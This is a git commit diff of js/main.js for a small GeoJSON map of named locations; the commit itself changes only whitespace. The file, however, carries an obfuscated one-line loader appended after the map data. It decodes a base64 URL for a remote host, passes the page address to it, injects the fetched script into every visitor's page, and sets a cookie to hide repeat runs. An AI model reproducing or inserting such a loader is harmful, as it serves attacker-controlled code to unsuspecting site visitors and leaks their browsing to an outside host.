c9f1db82e6539373c40602fe5a0aafef0e14426f
David <87504880+darud63@users.noreply.github.com>
2023-08-07 13:01:27 +0300

    Update main.js

--- js/main.js
+++ js/main.js
@@ -1,5 +1,5 @@
 var grrmmap={
 	type:"FeatureCollection",features:[
 		{ type: "Feature", geometry: { type: "Point", coordinates: [7000, 3000] }, properties: { name: "Карпатія", english: "Karpatiya", synonym: "-81", cat: "teh", url:"Карпатія",description:"info"}},
-		{type: "Feature", geometry: { type: "Point", coordinates: [5967,2642] }, properties: { name: "Дім", english: "Зайнято", synonym: "№1", cat: "misto",  loyal:"Pirikhh", url:"1",description:'<a href="#" class="flyToPoint">Кнопка</a><br/>Магазин книжок'}},
+		{ type: "Feature", geometry: { type: "Point", coordinates: [5967,2642] }, properties: { name: "Дім", english: "Зайнято", synonym: "№1", cat: "misto",  loyal:"Pirikhh", url:"1",description:'<a href="#" class="flyToPoint">Кнопка</a><br/>Магазин книжок'}},
 		{ type: "Feature", geometry: { type: "Point", coordinates: [1280, 893] }, properties: { name: "Портал в енд", english: "Енд", synonym: "256", cat: "teh", url:"Енд",description:"info"}}]};!function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);
